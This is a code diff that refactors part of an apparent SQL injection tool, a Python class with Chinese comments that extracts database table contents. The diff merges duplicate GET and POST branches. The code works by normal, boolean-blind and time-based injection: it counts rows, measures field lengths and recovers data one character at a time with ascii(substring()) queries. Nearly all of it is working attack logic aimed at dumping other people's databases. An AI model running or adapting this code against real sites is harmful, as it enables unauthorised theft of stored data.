@@ -101,228 +101,115 @@ class SqliContent(SqliColumns):
         content_len = 0
         logger.debug("Start sqli table %s column %s limit %d content..." % (table_name, column_name, limits))
 
-        # 先GET
-        if self.sqlirequest == "GET":
-            logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
+        logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
 
-            if self.sqlimethod == "normal":
+        if self.sqlimethod == "normal":
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
-                # 注这一条的数据长度
-                logger.debug("Start %dth content length sqli..." % (limits + 1))
+            # 注这一条的数据长度
+            logger.debug("Start %dth content length sqli..." % (limits + 1))
 
-                content_len = normal_injection(select="length(" + column_name + ")",
-                                               source=database_name + "." + table_name,
-                                               limit=limits,
-                                               dealpayload=self.dealpayload,
-                                               data=self.Data, isCount=True,
-                                               sqlirequest=self.sqlirequest
-                                               )
-
-                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
-
-                # 然后注content
-                logger.debug("Start %dth content sqli..." % (limits + 1))
-
-                content = normal_injection(select=column_name,
+            content_len = normal_injection(select="length(" + column_name + ")",
                                            source=database_name + "." + table_name,
                                            limit=limits,
                                            dealpayload=self.dealpayload,
-                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                           data=self.Data, isCount=True,
+                                           sqlirequest=self.sqlirequest
                                            )
 
-                logger.debug("Content sqli success...The content is %s..." % content)
+            logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
+            logger.info("[*] content_len: %d" % content_len)
 
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
+            # 然后注content
+            logger.debug("Start %dth content sqli..." % (limits + 1))
 
-            elif self.sqlimethod == "build":
+            content = normal_injection(select=column_name,
+                                       source=database_name + "." + table_name,
+                                       limit=limits,
+                                       dealpayload=self.dealpayload,
+                                       data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
+                                       )
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("Content sqli success...The content is %s..." % content)
 
-                # 然后注content 的 length
+            # 把content return回去，以元组的形式
+            contents = [column_name, content]
+            logger.info("[*] content: %s" % content)
+            result.put(tuple(contents))
 
-                retVal = build_injection(select="length(" + column_name + ")",
+        elif self.sqlimethod == "build":
+
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+
+            # 然后注content 的 length
+
+            retVal = build_injection(select="length(" + column_name + ")",
+                                     source=database_name + "." + table_name,
+                                     limit=limits,
+                                     dealpayload=self.dealpayload, data=self.Data,
+                                     lens=self.len,
+                                     isCount=True, sqlirequest=self.sqlirequest)
+            content_len = int(retVal)
+
+            logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
+            logger.info("[*] content_len: %d" % content_len)
+
+            # 然后注content名字
+            # 清空column_name
+            content = ""
+            logger.debug("Start %dth content sqli..." % (limits + 1))
+
+            for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
+                retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                                          source=database_name + "." + table_name,
                                          limit=limits,
-                                         dealpayload=self.dealpayload, data=self.Data,
-                                         lens=self.len,
-                                         isCount=True, sqlirequest=self.sqlirequest)
-                content_len = int(retVal)
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isStrings=True, sqlirequest=self.sqlirequest)
+                content += chr(retVal)
 
-                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
+            logger.debug("Content sqli success...The content is %s..." % content)
 
-                # 然后注content名字
-                # 清空column_name
-                content = ""
-                logger.debug("Start %dth content sqli..." % (limits + 1))
+            # 把content return回去，以元组的形式
+            contents = [column_name, content]
+            logger.info("[*] content: %s" % content)
+            result.put(tuple(contents))
 
-                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
-                    retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                                             source=database_name + "." + table_name,
-                                             limit=limits,
-                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                             isStrings=True, sqlirequest=self.sqlirequest)
-                    content += chr(retVal)
+        elif self.sqlimethod == "time":
 
-                logger.debug("Content sqli success...The content is %s..." % content)
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
+            # 然后注content 的length
 
-            elif self.sqlimethod == "time":
+            retVal = time_injection(select="length(" + column_name + ")",
+                                    source=database_name + "." + table_name,
+                                    limit=limits,
+                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                    isCount=True, sqlirequest=self.sqlirequest)
+            content_len = int(retVal)
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
+            logger.info("[*] content_len: %d" % content_len)
 
-                # 然后注content 的length
+            # 然后注content名字
+            # 清空column_name
+            content = ""
+            logger.debug("Start %dth content sqli..." % (limits + 1))
 
-                retVal = time_injection(select="length(" + column_name + ")",
+            for j in trange(int(content_len), desc='%dth Database sqli' % (limits + 1), leave=False):
+                retVal = time_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
                                         source=database_name + "." + table_name,
                                         limit=limits,
                                         dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                        isCount=True, sqlirequest=self.sqlirequest)
-                content_len = int(retVal)
+                                        isStrings=True, sqlirequest=self.sqlirequest)
+                content += chr(retVal)
 
-                logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
+            logger.debug("Content sqli success...The content is %s..." % content)
 
-                # 然后注content名字
-                # 清空column_name
-                content = ""
-                logger.debug("Start %dth content sqli..." % (limits + 1))
-
-                for j in trange(int(content_len), desc='%dth Database sqli' % (limits + 1), leave=False):
-                    retVal = time_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                                            source=database_name + "." + table_name,
-                                            limit=limits,
-                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                            isStrings=True, sqlirequest=self.sqlirequest)
-                    content += chr(retVal)
-
-                logger.debug("Content sqli success...The content is %s..." % content)
-
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
-
-        # 然后是post
-        elif self.sqlirequest == "POST":
-            logger.debug("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)
-
-            if self.sqlimethod == "normal":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-
-                # 首先是tablename的长度
-
-                content_len = normal_injection(select="length(" + column_name + ")",
-                                               source=database_name + "." + table_name,
-                                               limit=limits,
-                                               dealpayload=self.dealpayload,
-                                               data=self.Data, isCount=True,
-                                               sqlirequest=self.sqlirequest
-                                               )
-
-                logger.debug(
-                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
-
-                # 然后注content
-
-                content = normal_injection(select=column_name,
-                                           source=database_name + "." + table_name,
-                                           limit=limits,
-                                           dealpayload=self.dealpayload,
-                                           data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
-                                           )
-
-                logger.debug("Content sqli success...The content is %s..." % content)
-
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
-
-            elif self.sqlimethod == "build":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-
-                # 然后注content 的length
-                retVal = build_injection(select="length(" + column_name + ")",
-                                         source=database_name + "." + table_name,
-                                         limit=limits,
-                                         dealpayload=self.dealpayload, data=self.Data,
-                                         lens=self.len,
-                                         isCount=True, sqlirequest=self.sqlirequest)
-                content_len = int(retVal)
-
-                logger.debug(
-                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
-
-                # 然后注content名字
-                # 清空column_name
-                content = ""
-                logger.debug("Start %dth content sqli..." % (limits + 1))
-
-                for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False):
-                    retVal = build_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                                             source=database_name + "." + table_name,
-                                             limit=limits,
-                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                             isStrings=True, sqlirequest=self.sqlirequest)
-                    content += chr(retVal)
-
-                logger.debug("Content sqli success...The content is %s..." % content)
-
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
-
-            elif self.sqlimethod == "time":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-
-                # 然后注content 的length
-                retVal = time_injection(select="length(" + column_name + ")",
-                                        source=database_name + "." + table_name,
-                                        limit=limits,
-                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                        isCount=True, sqlirequest=self.sqlirequest)
-                content_len = int(retVal)
-
-                logger.debug(
-                    "Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
-                logger.info("[*] content_len: %d" % content_len)
-
-                # 然后注content名字
-                # 清空column_name
-                content = ""
-                logger.debug("Start %dth content sqli..." % (limits + 1))
-
-                for j in trange(int(content_len), desc='%dth Database sqli' % (limits + 1), leave=False):
-                    retVal = time_injection(select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
-                                            source=database_name + "." + table_name,
-                                            limit=limits,
-                                            dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                            isStrings=True, sqlirequest=self.sqlirequest)
-                    content += chr(retVal)
-
-                logger.debug("Content sqli success...The content is %s..." % content)
-
-                # 把content return回去，以元组的形式
-                contents = [column_name, content]
-                logger.info("[*] content: %s" % content)
-                result.put(tuple(contents))
+            # 把content return回去，以元组的形式
+            contents = [column_name, content]
+            logger.info("[*] content: %s" % content)
+            result.put(tuple(contents))
 
         logger.debug("Sqli table %s column %s limit %d success..." % (table_name, column_name, limits))
 
@@ -332,122 +219,58 @@ class SqliContent(SqliColumns):
         # 开始注内容
         logger.debug("Start sqli table %s content amount..." % table_name)
 
-        # 先GET
-        if self.sqlirequest == "GET":
-            logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
+        logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
 
-            if self.sqlimethod == "normal":
+        if self.sqlimethod == "normal":
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                logger.debug("Start table's %s content amount sqli..." % table_name)
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("Start table's %s content amount sqli..." % table_name)
 
-                # 注数据的数量
-                content_count = normal_injection(select="count(*)",
-                                                 source=database_name + "." + table_name,
-                                                 dealpayload=self.dealpayload,
-                                                 data=self.Data, isCount=True, sqlirequest=self.sqlirequest
-                                                 )
-                logger.debug("Content account sqli success...The count is %d..." % content_count)
+            # 注数据的数量
+            content_count = normal_injection(select="count(*)",
+                                             source=database_name + "." + table_name,
+                                             dealpayload=self.dealpayload,
+                                             data=self.Data, isCount=True, sqlirequest=self.sqlirequest
+                                             )
+            logger.debug("Content account sqli success...The count is %d..." % content_count)
 
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
+            # 把content account return回去
+            logger.info("[*] content count: %d" % content_count)
+            return content_count
 
-            elif self.sqlimethod == "build":
+        elif self.sqlimethod == "build":
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                logger.debug("Start table's %s content amount sqli..." % table_name)
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("Start table's %s content amount sqli..." % table_name)
 
-                retVal = build_injection(select="count(*)",
-                                         source=database_name + "." + table_name,
-                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                         isCount=True, sqlirequest=self.sqlirequest)
-                content_count = int(retVal)
+            retVal = build_injection(select="count(*)",
+                                     source=database_name + "." + table_name,
+                                     dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                     isCount=True, sqlirequest=self.sqlirequest)
+            content_count = int(retVal)
 
-                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
-                logger.info("[*] content_count: %d" % content_count)
+            logger.debug("Content account sqli success...The content_count is %d..." % content_count)
+            logger.info("[*] content_count: %d" % content_count)
 
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
+            # 把content account return回去
+            logger.info("[*] content count: %d" % content_count)
+            return content_count
 
-            elif self.sqlimethod == "time":
+        elif self.sqlimethod == "time":
 
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
+            logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
-                logger.debug("Start table's %s content amount sqli..." % table_name)
+            logger.debug("Start table's %s content amount sqli..." % table_name)
 
-                retVal = time_injection(select="count(*)",
-                                        source=database_name + "." + table_name,
-                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                        isCount=True, sqlirequest=self.sqlirequest)
-                content_count = int(retVal)
+            retVal = time_injection(select="count(*)",
+                                    source=database_name + "." + table_name,
+                                    dealpayload=self.dealpayload, data=self.Data, times=self.time,
+                                    isCount=True, sqlirequest=self.sqlirequest)
+            content_count = int(retVal)
 
-                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
-                logger.info("[*] content_count: %d" % content_count)
+            logger.debug("Content account sqli success...The content_count is %d..." % content_count)
+            logger.info("[*] content_count: %d" % content_count)
 
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
-
-        # 然后是post
-        elif self.sqlirequest == "POST":
-            logger.debug("The sqlirequest is %s, start sqli contents..." % self.sqlirequest)
-
-            if self.sqlimethod == "normal":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                logger.debug("Start table's %s content amount sqli..." % table_name)
-
-                # 注数据的数量
-
-                content_count = normal_injection(select="count(*)",
-                                                 source=database_name + "." + table_name,
-                                                 dealpayload=self.dealpayload,
-                                                 data=self.Data, isCount=True, sqlirequest=self.sqlirequest
-                                                 )
-
-                logger.debug("Content account sqli success...The count is %d..." % content_count)
-
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
-
-            elif self.sqlimethod == "build":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                logger.debug("Start table's %s content amount sqli..." % table_name)
-
-                retVal = build_injection(select="count(*)",
-                                         source=database_name + "." + table_name,
-                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
-                                         isCount=True, sqlirequest=self.sqlirequest)
-                content_count = int(retVal)
-
-                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
-                logger.info("[*] content_count: %d" % content_count)
-
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
-
-            elif self.sqlimethod == "time":
-
-                logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-
-                logger.debug("Start table's %s content amount sqli..." % table_name)
-
-                retVal = time_injection(select="count(*)",
-                                        source=database_name + "." + table_name,
-                                        dealpayload=self.dealpayload, data=self.Data, times=self.time,
-                                        isCount=True, sqlirequest=self.sqlirequest)
-                content_count = int(retVal)
-
-                logger.debug("Content account sqli success...The content_count is %d..." % content_count)
-                logger.info("[*] content_count: %d" % content_count)
-
-                # 把content account return回去
-                logger.info("[*] content count: %d" % content_count)
-                return content_count
-
-
+            # 把content account return回去
+            logger.info("[*] content count: %d" % content_count)
+            return content_count
